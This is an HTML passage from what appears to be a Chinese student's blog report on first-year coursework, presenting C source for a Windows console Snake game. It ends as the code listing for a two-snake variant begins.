        <content type="html"><![CDATA[<h1 id="工程实践作业报告"><a href="#工程实践作业报告" class="headerlink" title="工程实践作业报告"></a>工程实践作业报告</h1><p>写这篇文章也就是对大一的一个总结吧，之前一直在准备期末考试和交各种报告什么的，也没时间搞这些，关于后期打算就是，学习数据结构，c++，java，了解web相关的知识，然后有空刷刷题，打打比赛吧。</p><h2 id="工程实践报告"><a href="#工程实践报告" class="headerlink" title="工程实践报告"></a>工程实践报告</h2><h3 id="贪吃蛇"><a href="#贪吃蛇" class="headerlink" title="贪吃蛇"></a>贪吃蛇</h3><p>一个经典的c程序，在看了别人代码后自己实现了下，编译环境dev。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gotoxy</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gotoxy_print</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gotoxy_delete</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gotoxy_food</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hellow</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">end</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creat_frame</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_food</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_way</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_end</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">snake_move</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eat_food</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">end_to_head</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Snakes</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Snakes</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;snake;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Food</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">&#125;food;</span><br><span class="line"></span><br><span class="line">snake *head;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">char</span> way=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">int</span> score=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;color 03&quot;</span>);</span><br><span class="line">    hellow();</span><br><span class="line">    creat_frame();</span><br><span class="line">    create_food();</span><br><span class="line">    check_way();</span><br><span class="line">    gotoxy(<span class="number">0</span>,<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gotoxy</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 更新光标位置 </span></span><br><span class="line">    COORD pos;</span><br><span class="line">    HANDLE hOutput = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">    pos.X = x;</span><br><span class="line">    pos.Y = y;</span><br><span class="line">    SetConsoleCursorPosition(hOutput, pos);</span><br><span class="line">    <span class="comment">// 隐藏光标 </span></span><br><span class="line">    CONSOLE_CURSOR_INFO cursor;</span><br><span class="line">    cursor.bVisible = FALSE;    </span><br><span class="line">    cursor.dwSize = <span class="keyword">sizeof</span>(cursor);</span><br><span class="line">    SetConsoleCursorInfo(hOutput, &amp;cursor);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hellow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    gotoxy(<span class="number">10</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;/***************************************/&quot;</span>);</span><br><span class="line">    gotoxy(<span class="number">17</span>,<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;welocme to this game&quot;</span>);</span><br><span class="line">    gotoxy(<span class="number">10</span>,<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;/***************************************/&quot;</span>);</span><br><span class="line">    gotoxy(<span class="number">17</span>,<span class="number">7</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input your name:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,name);   </span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creat_frame</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    snake *p,*q;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">28</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        gotoxy_print(<span class="number">0</span>,i);</span><br><span class="line">        gotoxy_print(<span class="number">66</span>,i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">66</span>;i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        gotoxy_print(i,<span class="number">0</span>);</span><br><span class="line">        gotoxy_print(i,<span class="number">27</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    head = (snake*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(snake));</span><br><span class="line">    p=(snake*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(snake));</span><br><span class="line">    q=(snake*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(snake));</span><br><span class="line">    head-&gt;x=<span class="number">14</span>;</span><br><span class="line">    head-&gt;y=<span class="number">16</span>;</span><br><span class="line">    p-&gt;x=<span class="number">14</span>;</span><br><span class="line">    p-&gt;y=<span class="number">14</span>;</span><br><span class="line">    q-&gt;x=<span class="number">14</span>;</span><br><span class="line">    q-&gt;y=<span class="number">15</span>;</span><br><span class="line">    head-&gt;next=p;</span><br><span class="line">    p-&gt;next=q;</span><br><span class="line">    q-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_food</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!flag)</span><br><span class="line">    &#123;</span><br><span class="line">        flag=<span class="number">1</span>;</span><br><span class="line">        srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">        x =rand()%<span class="number">64</span>+<span class="number">1</span>;  </span><br><span class="line">        y=rand()%<span class="number">26</span>+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (x % <span class="number">2</span> !=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            x = x + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        snake *mid;</span><br><span class="line">        mid=head;</span><br><span class="line">        <span class="keyword">while</span>(mid-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((x==mid-&gt;x)&amp;&amp;(y==mid-&gt;y))</span><br><span class="line">            &#123;</span><br><span class="line">                flag=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mid=mid-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        food.x=x;</span><br><span class="line">        food.y=y;   </span><br><span class="line">    &#125;</span><br><span class="line">    gotoxy_food(food.x,food.y);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_way</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(check_end()==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            end();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> just;</span><br><span class="line">        just=way;</span><br><span class="line">        <span class="keyword">if</span>(_kbhit())</span><br><span class="line">        &#123;   </span><br><span class="line">            way = _getch();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(just==<span class="string">&#x27;w&#x27;</span>&amp;&amp;way==<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            way=<span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(just==<span class="string">&#x27;s&#x27;</span>&amp;&amp;way==<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            way=<span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(just==<span class="string">&#x27;a&#x27;</span>&amp;&amp;way==<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            way=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(just==<span class="string">&#x27;d&#x27;</span>&amp;&amp;way==<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            way=<span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        snake_move();</span><br><span class="line">        eat_food();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">snake_move</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    snake *mid=head;</span><br><span class="line"></span><br><span class="line">    x=head-&gt;x;</span><br><span class="line">    y=head-&gt;y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(mid-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        mid=mid-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    gotoxy_delete(mid-&gt;x,mid-&gt;y);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(way)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">            y-=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            y+=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            x-=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            x+=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(x != head-&gt;x || y != head-&gt;y)</span><br><span class="line">    &#123;</span><br><span class="line">        end_to_head(x,y);</span><br><span class="line">    &#125;</span><br><span class="line">    gotoxy_print(head-&gt;x, head-&gt;y);</span><br><span class="line">    Sleep(<span class="number">150</span>-score*<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">end_to_head</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    snake *new_head;</span><br><span class="line">    snake *p=head;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p-&gt;next);</span><br><span class="line">    p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    new_head=(snake*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(snake));</span><br><span class="line">    new_head-&gt;x=x;</span><br><span class="line">    new_head-&gt;y=y;</span><br><span class="line">    new_head-&gt;next=head;</span><br><span class="line">    head=new_head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eat_food</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    snake *p=head;</span><br><span class="line">    <span class="keyword">if</span>(head-&gt;x==food.x&amp;&amp;head-&gt;y==food.y)</span><br><span class="line">    &#123;</span><br><span class="line">        create_food();</span><br><span class="line">        snake *new_one;</span><br><span class="line">        new_one=(snake*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(snake));</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        new_one-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;next=new_one;</span><br><span class="line">        score ++;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    snake *p=head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(head-&gt;x==<span class="number">0</span>||head-&gt;x==<span class="number">66</span>||head-&gt;y==<span class="number">0</span>||head-&gt;y==<span class="number">27</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(head-&gt;x==p-&gt;x&amp;&amp;head-&gt;y==p-&gt;y) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    snake *p=head,*q;</span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;end&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        q=p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        p=q;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gotoxy_print</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    gotoxy(x,y);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;⊙&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gotoxy_delete</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    gotoxy(x,y);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gotoxy_food</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    gotoxy(x,y);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;⊙&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后想了想可以不可以做成双蛇，然后就继续写了写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span 